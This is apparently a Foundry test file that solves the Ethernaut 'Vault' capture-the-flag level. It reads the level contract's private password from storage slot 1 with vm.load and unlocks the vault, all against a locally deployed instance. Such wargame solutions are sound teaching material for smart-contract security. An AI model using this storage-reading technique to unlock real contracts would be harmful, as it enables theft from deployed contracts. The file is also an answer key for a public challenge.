//SPDX-Lincense-Identifier: MIT
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "ethernaut/Ethernaut.sol";
import "ethernaut/Vault/VaultFactory.sol";

contract VaultTest is DSTest {
    //state variables
    Vm vm = Vm(address(HEVM_ADDRESS));
    Ethernaut ethernaut;
    address attacker = address(0xbabe);

    //set up the state variables
    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    //level set up, attack and submission
    function testVaultHack() public {
        //LEVEL SET UP
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault vaultContract = Vault(payable(levelAddress));

        //LEVEL ATTACK
       bytes32 stolenPassword = vm.load(levelAddress, bytes32(uint256(1))); //vm.load loads a storage slot from a contract
       vaultContract.unlock(stolenPassword);

        //LEVEL SUBMISSION
        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }
}